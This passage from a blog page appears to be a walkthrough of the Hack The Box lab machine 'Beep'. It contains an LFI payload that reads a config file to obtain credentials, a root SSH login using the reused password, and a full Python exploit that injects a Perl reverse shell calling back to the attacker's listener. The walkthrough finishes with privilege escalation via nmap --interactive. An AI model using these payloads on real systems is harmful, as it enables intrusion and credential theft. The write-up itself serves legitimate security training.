+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">CentOS</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">15</span><span class="n">T22</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">00</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">1</span><span class="n">h00m01s</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">localhost</span><span class="p">.</span><span class="n">localdomain</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">SomeOrganization</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">SomeState</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">07</span><span class="n">T08</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">08</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2018</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">07</span><span class="n">T08</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">08</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">disallowed</span><span class="w"> </span><span class="n">entry</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Elastix</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">page</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">878</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">status</span><span class="w">     </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">RPC</span><span class="w"> </span><span class="o">#</span><span class="mi">100024</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">993</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">imap</span><span class="w">   </span><span class="n">Cyrus</span><span class="w"> </span><span class="n">imapd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_imap</span><span class="o">-</span><span class="n">capabilities</span><span class="p">:</span><span class="w"> </span><span class="n">CAPABILITY</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">995</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">pop3</span><span class="w">       </span><span class="n">Cyrus</span><span class="w"> </span><span class="n">pop3d</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">known</span><span class="o">-</span><span class="k">key</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">nextprotoneg</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_sslv2</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">mysql</span><span class="w">      </span><span class="n">MySQL</span><span class="w"> </span><span class="p">(</span><span class="n">unauthorized</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">nextprotoneg</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_sslv2</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4190</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">sieve</span><span class="w">      </span><span class="n">Cyrus</span><span class="w"> </span><span class="n">timsieved</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="n">Invoca</span><span class="o">-</span><span class="n">RPM</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="mi">7</span><span class="p">.</span><span class="n">el5_6</span><span class="p">.</span><span class="mi">4</span><span class="w"> </span><span class="p">(</span><span class="n">included</span><span class="w"> </span><span class="n">w</span><span class="o">/</span><span class="n">cyrus</span><span class="w"> </span><span class="n">imap</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4445</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">upnotifyp</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4559</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">hylafax</span><span class="w">    </span><span class="n">HylaFAX</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5038</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">asterisk</span><span class="w">   </span><span class="n">Asterisk</span><span class="w"> </span><span class="k">Call</span><span class="w"> </span><span class="n">Manager</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">       </span><span class="n">MiniServ</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">570</span><span class="w"> </span><span class="p">(</span><span class="n">Webmin</span><span class="w"> </span><span class="n">httpd</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have a title (text/html; Charset=iso-8859-1).
+</span></span></span><span class="line"><span class="cl"><span class="s1">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_clock-skew: 1h00m00s
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Nmap done at Sun Jan 16 05:42:46 2022 -- 1 IP address (1 host up) scanned in 332.87 seconds
+</span></span></span></code></pre></div><p>that&rsquo;s bunch of the open ports on this machine.</p>
+<h3 id="webserver">Webserver</h3>
+<p>This machine has apache running on <code>port 80</code>. When I visited the page it was redirected into <code>port 443</code> which is the Elastix login page.</p>
+<p><img src="elastix_login_page.png" alt=""></p>
+<h3 id="gobuster">Gobuster</h3>
+<p>Well, I&rsquo;m gonna run the <code>gobuster</code> on this webserver. Try to find any hidden directory on it. I&rsquo;m gonna use the <code>PHP</code> as <code>-x</code> extension because this server running on PHP.</p>
+<p><img src="gobuster.png" alt=""></p>
+<h3 id="admin">/admin</h3>
+<p>The <code>/admin</code> really does sound good to me. When I visited the admin page. It&rsquo;s prompt me with <code>login forms</code>.</p>
+<p><img src="admin_login.png" alt=""></p>
+<p>I try a bunch of passwords such as <code>admin:admin</code> but it doesn&rsquo;t work. However, when I clicked the <code>cancel</code> button. It goes to this page <code>https://10.10.10.7/admin/config.php</code> and displays the <code>Unauthorized</code> message.</p>
+<p><img src="freepbx_cancel.png" alt=""></p>
+<h3 id="local-file-inclusionlfi">Local File Inclusion/LFI</h3>
+<p>This box has an <code>LFI</code> tag on it. I know it sounds not fair at all but information matters.
+So, I&rsquo;m run the <code>searchsploit</code> and found this.</p>
+<p><img src="elastix_lfi.png" alt=""></p>
+<p>I&rsquo;m gonna mirror/copy this exploit in my current directory with <code>-m</code> flag. Here is the exploit/PoC :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">#</span><span class="nx">LFI</span> <span class="nx">Exploit</span><span class="o">:</span> <span class="err">/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span>
+</span></span></code></pre></div><p>it&rsquo;s basically, using <code>current_language</code> as the parameter. This <code>PoC</code> already includes the <code>config file</code> on it. I&rsquo;m gonna copy/paste this in my browser and VOILA!</p>
+<p><img src="conf_file.png" alt=""></p>
+<p>I managed to grab a bunch of passwords that appear in this file but a lot of passwords seem to be <code>commented</code> out.
+Just one password does not get commented out and appears more often in here.</p>
+<h2 id="method-1">Method: 1</h2>
+<h3 id="ssh">SSH</h3>
+<p>The Nmap scan result shows us <code>port 22</code> is open. Well, I&rsquo;ve got the potential password and don&rsquo;t know what users it belongs to. So, I&rsquo;m gonna try my luck to go with the <code>root</code> user</p>
+<pre tabindex="0"><code>Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+</code></pre><p>If you get one of these errors just like me. You need to run an ssh command like this</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -oKexAlgorithms<span class="o">=</span>+diffie-hellman-group1-sha1 root@10.10.10.7
+</span></span></code></pre></div><p>source - <a href="https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/">Solution for SSH unable to Negotiate Errors</a></p>
+<p><img src="ssh_root.png" alt=""></p>
+<p>Finally, I login in as root through <code>SSH</code>. Let&rsquo;s get the <code>user</code> and <code>root</code> flags.</p>
+<h3 id="the-flag">the flag</h3>
+<p><img src="the_flag.png" alt=""></p>
+<h2 id="method-2">Method: 2</h2>
+<h3 id="rce">RCE</h3>
+<p>The last exploit I&rsquo;m using was <code>LFI 'graph.php'</code> and the version of <code>Elastix</code> was <code>2.2.0</code> and this <code>RCE</code> have the same version of Elastix.</p>
+<p><img src="rce_freepbx.png" alt=""></p>
+<p>As always, I&rsquo;m gonna mirror/copy this exploit into my current working directory with the <code>-m</code> flag. When I ran the exploit it shows a bunch of errors regard to <code>SSL</code>. I tried fixing the error by changing the python code and it was painful but I managed to fix it. Here is the code:</p>
+<h3 id="18650py3">18650.py3</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ssl</span><span class="o">,</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rhost</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.7&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">lhost</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;lhost&gt;: &#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">lport</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;lport&gt;: &#34;</span><span class="p">)</span>        
+</span></span><span class="line"><span class="cl"><span class="n">ext</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;ext&gt;: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">head</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">/recordings/misc/callme_page.php?action=c&amp;callmenum=</span><span class="si">{</span><span class="n">ext</span><span class="si">}</span><span class="s2">@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22</span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s2">%3a</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s2">%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">head</span> <span class="o">+</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SSL Handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">(</span><span class="n">cert_reqs</span><span class="o">=</span><span class="s2">&#34;CERT_NONE&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Execute</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ExPl0itInG...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="svwarsipvicious">svwar/SIPVicious</h3>
+<p>I ran the exploit one more time and it doesn&rsquo;t work. I&rsquo;m speechless and I saw the <code>extension</code> in the original script that set the value into <code>1000</code> and maybe this is not a valid extension. So, I&rsquo;m gonna run the <code>svwar/SIPVicious</code> tool to identify a working extension.</p>
+<p>I&rsquo;m gonna run this command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svwar -m INVITE -e100-400 10.10.10.7
+</span></span></code></pre></div><p><img src="svwar.png" alt=""></p>
+<h2 id="shell-as-asterisk">Shell as Asterisk</h2>
+<p>Now, let&rsquo;s run the exploit again and make sure to set up the Netcat listener first.</p>
+<p><img src="shell.png" alt=""></p>
+<p>YES! it worked. Based on the comment in the original exploit, I can be a root user by using <code>nmap --interactive</code>. Let&rsquo;s do it.</p>
+<p><img src="nmap_root.png" alt=""></p>
+<p>TADAA!! Now, I&rsquo;m a root user.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
